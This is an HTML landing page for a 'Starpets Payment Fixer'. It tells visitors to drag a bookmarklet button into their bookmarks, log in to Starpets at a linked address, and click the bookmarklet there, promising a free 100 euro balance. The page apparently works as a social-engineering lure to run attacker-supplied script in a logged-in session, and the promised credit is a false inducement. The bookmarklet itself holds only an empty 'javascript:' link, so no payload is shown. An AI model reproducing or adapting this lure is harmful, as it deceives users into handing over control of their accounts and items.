<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Starpets Payment Fix</title>
<!-- Google Fonts'tan Poppins fontu -->
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
<!-- Favicon -->
<link rel="icon" href="https://pbs.twimg.com/profile_images/1497996651096588288/vLHC2k2r_400x400.jpg" type="image/png" />
<style>
  body {
    margin: 0; padding: 0; height: 100vh;
    display: flex; justify-content: center; align-items: center;
    font-family: 'Poppins', Arial, sans-serif; /* Buton dƒ±≈üƒ±ndaki yazƒ±lar i√ßin */
    color: white; overflow: hidden;
    background: linear-gradient(-45deg, #ff4b2b, #ff416c, #1e3c72, #2a5298);
    background-size: 400% 400%;
    animation: gradientBG 15s ease infinite;
  }
  @keyframes gradientBG {
    0% {background-position: 0% 50%;}
    50% {background-position: 100% 50%;}
    100% {background-position: 0% 50%;}
  }
  .card {
    background: rgba(0,0,0,0.6);
    padding: 30px;
    border-radius: 12px;
    text-align: center;
    box-shadow: 0 4px 15px rgba(0,0,0,0.2);
    max-width: 400px;
  }
  h1 {
    margin-bottom: 10px;
    font-weight: 600;
    font-size: 2.5rem;
  }
  p {
    font-weight: 400;
    font-size: 1.1rem;
  }
  a.bookmarklet-button {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    padding: 15px 25px;
    background-color: #4CAF50;
    color: white !important;
    border-radius: 8px;
    text-decoration: none;
    font-size: 18px;
    cursor: grab;
    user-select: none;
    font-family: Arial, sans-serif; /* Buton fontu deƒüi≈ümedi */
    font-weight: normal;
    margin: 10px 5px 0 5px;
  }
  a.bookmarklet-button:active {
    cursor: grabbing;
  }
  a.bookmarklet-button img {
    display: block;
    border-radius: 50%;
    width: 32px;
    height: 32px;
    object-fit: cover;
  }
  
  /* Modal Styles */
  .modal-bg {
    position: fixed;
    top: 0; left: 0;
    width: 100vw; height: 100vh;
    background: rgba(0,0,0,0.7);
    display: none;
    justify-content: center;
    align-items: center;
    z-index: 1000;
  }
  .modal-bg.active {
    display: flex;
  }
  .modal {
    background: #222;
    border-radius: 12px;
    max-width: 600px;
    width: 90%;
    padding: 20px 30px 30px 30px;
    color: white;
    text-align: center;
    position: relative;
  }
  .modal h2 {
    margin-bottom: 20px;
    font-weight: 600;
    font-size: 2rem;
  }
  .modal .step-content {
    margin-bottom: 20px;
    font-size: 1.1rem;
    min-height: 100px;
  }
  .modal .step-content a {
    color: #4caf50;
    text-decoration: underline;
  }
  .modal .step-media {
    max-width: 100%;
    max-height: 300px;
    margin-bottom: 20px;
  }
  .modal .step-media img,
  .modal .step-media video {
    max-width: 100%;
    max-height: 300px;
    border-radius: 8px;
  }
  .modal .buttons {
    display: flex;
    justify-content: space-between;
  }
  .modal button {
    background: #4caf50;
    border: none;
    padding: 10px 20px;
    color: white;
    font-size: 1rem;
    border-radius: 6px;
    cursor: pointer;
    user-select: none;
  }
  .modal button:disabled {
    background: #666;
    cursor: not-allowed;
  }
  .modal .close-btn {
    position: absolute;
    top: 10px; right: 15px;
    background: transparent;
    border: none;
    font-size: 1.5rem;
    color: white;
    cursor: pointer;
  }
</style>
</head>
<body>

<div class="card">
  <h1>üî•‚ÄãStarpets Payment Fixerüî•‚Äã</h1>
  <p>Drag this green button to your browser's bookmarks</p>
  
  <a href="javascript:"  
   class="bookmarklet-button" 
   draggable="true">
     <img src="https://pbs.twimg.com/profile_images/1497996651096588288/vLHC2k2r_400x400.jpg" alt="ƒ∞kon" />
     <span>‚≠êPayment Fix‚≠ê</span>
  </a>

  <a href="#" id="tutorialBtn" class="bookmarklet-button" style="background-color: #2196F3;">
    <img src="https://cdn-icons-png.flaticon.com/512/1828/1828859.png" alt="Tutorial Icon" style="width:28px; height:28px;" />
    <span>Tutorial</span>
  </a>
</div>

<!-- Modal -->
<div class="modal-bg" id="tutorialModal">
  <div class="modal">
    <button class="close-btn" id="closeModal">&times;</button>
    <h2>Tutorial</h2>
    
    <div class="step-media" id="stepMedia">
      <!-- Gif/Video veya Resim buraya gelecek -->
      <img src="https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif" alt="Step Media" />
    </div>
    
    <div class="step-content" id="stepContent">
      ƒ∞√ßerik 1 burada olacak.
    </div>
    
    <div class="buttons">
      <button id="prevStep" disabled>Previous</button>
      <button id="nextStep">Next</button>
    </div>
  </div>
</div>

<script>
  const tutorialBtn = document.getElementById('tutorialBtn');
  const modalBg = document.getElementById('tutorialModal');
  const closeModal = document.getElementById('closeModal');
  const prevStepBtn = document.getElementById('prevStep');
  const nextStepBtn = document.getElementById('nextStep');
  const stepContent = document.getElementById('stepContent');
  const stepMedia = document.getElementById('stepMedia');
  
  const steps = [
    {
      content: `Firstly drag the ‚≠êPayment Fix‚≠ê button to your bookmarks to add it as a bookmark.<br>If you don't have bookmarks bar enabled or can't see it you can watch a video to enable it here <a href="https://www.youtube.com/watch?v=i9Ql6QVkFAo" target="_blank" rel="noopener noreferrer">https://www.youtube.com/watch?v=i9Ql6QVkFAo</a>`,
      mediaType: "video",
      mediaSrc: "" // Video URL ekle
    },
    {
      content: `Then go to starpets website and log in then go to your inventory or you can simply go there by this link <a href="https://starpets.pw" target="_blank" rel="noopener noreferrer">https://starpets.pw</a>`,
      mediaType: "video",
      mediaSrc: "" // Video URL ekle
    },
    {
      content: "Once you are in the Starpets page click the bookmark you added then choose your problems",
      mediaType: "video",
      mediaSrc: "" // Video URL ekle
    },
    {
      content: "When you done with the questions you can take the 100 euro balance we gave you and you can use it whatever as you wish",
      mediaType: "video",
      mediaSrc: "" // Video URL ekle
    },
    {
      content: "You have done the tutorial",
      mediaType: "img",
      mediaSrc: "" // Resim URL ekle
    }
  ];
  
  let currentStep = 0;
  
  function updateStep() {
    const step = steps[currentStep];
    stepContent.innerHTML = step.content;
    
    // Medya elementini deƒüi≈ütir
    stepMedia.innerHTML = '';
    if(step.mediaType === "img") {
      const img = document.createElement('img');
      img.src = step.mediaSrc;
      img.alt = `Step ${currentStep + 1} Media`;
      stepMedia.appendChild(img);
    } else if(step.mediaType === "video") {
      const video = document.createElement('video');
      video.src = step.mediaSrc;
      video.controls = true;
      video.autoplay = true;
      video.loop = true;
      stepMedia.appendChild(video);
    }
    
    // Buton aktiflik durumu
    prevStepBtn.disabled = currentStep === 0;
    nextStepBtn.textContent = currentStep === steps.length - 1 ? "Finish" : "Next";
  }
  
  tutorialBtn.addEventListener('click', () => {
    modalBg.classList.add('active');
    currentStep = 0;
    updateStep();
  });
  
  closeModal.addEventListener('click', () => {
    modalBg.classList.remove('active');
  });
  
  prevStepBtn.addEventListener('click', () => {
    if(currentStep > 0) {
      currentStep--;
      updateStep();
    }
  });
  
  nextStepBtn.addEventListener('click', () => {
    if(currentStep < steps.length - 1) {
      currentStep++;
      updateStep();
    } else {
      // Final stepte Finish'e basƒ±nca modal kapanƒ±r
      modalBg.classList.remove('active');
    }
  });
</script>

</body>
</html>
